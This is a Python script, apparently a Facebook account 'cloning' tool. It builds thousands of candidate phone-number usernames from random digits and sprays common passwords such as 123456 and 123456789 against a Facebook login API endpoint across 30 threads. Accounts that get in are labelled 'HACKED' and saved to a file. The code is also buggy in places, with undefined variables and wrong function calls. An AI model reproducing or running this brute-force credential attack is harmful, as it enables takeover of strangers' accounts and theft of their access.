#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ uj

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 D39.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

##logo
_logo_line_1_ = ('\x1b[1;91m___   ___ ___ ___ _______ _______')
_logo_line_2_ = ('\x1b[1;91m| |   | | | | | | |  ___| |_   _|')
_logo_line_3_ = ('\x1b[1;92m| |___| | | | | | | |___    | |  ')
_logo_line_4_ = ('\x1b[1;92m|  ___  | | | | | |___  |   | |  ')
_logo_line_5_ = ('\x1b[1;91m| |   | | | |_| | ____| |  _| |  ')
_logo_line_6_ = ('\x1b[1;91m|_|   |_| |_____| |_____| |___|  ')
_logo_line_7_ = ('\x1b[1;97m-------------------------------------------------')
def _my_logo_():
    print(_logo_line_1_)
    print(_logo_line_2_)
    print(_logo_line_3_)
    print(_logo_line_4_)
    print(_logo_line_5_)
    print(_logo_line_6_)
    print(_logo_line_7_+'\n')

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in w:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print ('\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mUJ OLD TOOL Loa\x1b[1;90mding \x1b[1;97m' + o,)
        sys.stdout.flush()
        time.sleep(0.5)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
_my_logo_()
CorrectUsername = 'UnicUJ'
CorrectPassword = 'Tanasha'
loop = 'true'
while loop == 'true':
    username = input('\x1b[1;92m \x1b[1;92mTool Username \x1b[1;92m:\x1b[1;92m ')
    if username == CorrectUsername:
        password = input('\x1b[1;92m \x1b[1;92mTool Password \x1b[1;92m:\x1b[1;92m ')
        if password == CorrectPassword:
            print ('Login Successfull as uj')
            time.sleep(1)
            loop = 'false'
        else:
            print ('\x1b[1;92mWrong Password')
    else:
        print ('\x1b[1;92mWrong Username')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    _my_logo_()
    print
    print ('\x1b[1;92m(1) START CLONING [2008]')
    print ('\x1b[1;92m(1) START CLONING [2009]')
    print ('\x1b[1;97m(0) Back')
    pilih_Somi()


def pilih_Somi():
    Somi = input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    if Somi == '':
        print ('\x1b[1;97mFill In Correctly')
        login()
    elif Somi == '1':
        p()
    elif Somi == '2':
        b()
    else:
        print ('Fill In Correctly')


def p():
    os.system('clear')
    _my_logo_()
    print
    print
    print ('Do you want countinue [y/n]')
    act()


def act():
    somi = input('\n\n \x1b[1;97m  ')
    if somi == '':
        print ('[!] Fill in correctly')
        act()
    elif somi == 'y':
        tik()
        os.system('clear')
        _my_logo_()
        print
        print ('\x1b[1;93mTYPE ANY TWO CODE')
        print ('\n')
        print
        try:
            c = input('>>> ')
            k = '51'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found')
            input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print ('[!] Fill In Correctly')
        action()
    print (47 * '\x1b[1;93m-')
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print (47 * '\x1b[1;93m-')

    def main(arg):
        global cpb
        global oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1)
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1)
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2)
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2)
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '@@123@@'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3)
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3)
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print (50 * '\x1b[1;91m-')
    print ('Process Has Been Completed ...')
    input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


def b():
    os.system('clear')
    _my_logo_()
    print
    print
    print ('Do you want countinue [y/n]')
    action()


def action():
    somi = input('\n\n \x1b[1;97m  ')
    if somi == '':
        print ('[!] Fill in correctly')
        action()
    elif somi == 'y':
        tik()
        os.system('clear')
        _my_logo_()
        print
        try:
            c = input('TYPE ANY 1 DIGIT NUMBER >>>')
            k = '1000000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found')
            input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print ('[!] Fill In Correctly')
        action()
    print (47 * '\x1b[1;93m-')
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print (47 * '\x1b[1;93m-')

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1)
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1)
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2)
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2)
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '1234567'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3)
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3)
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '12345678'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4)
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4)
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print (50 * '\x1b[1;91m-')
    print ('Process Has Been Completed ...')
    print ('Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb)))
    input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    os.system('git pull')
    login()
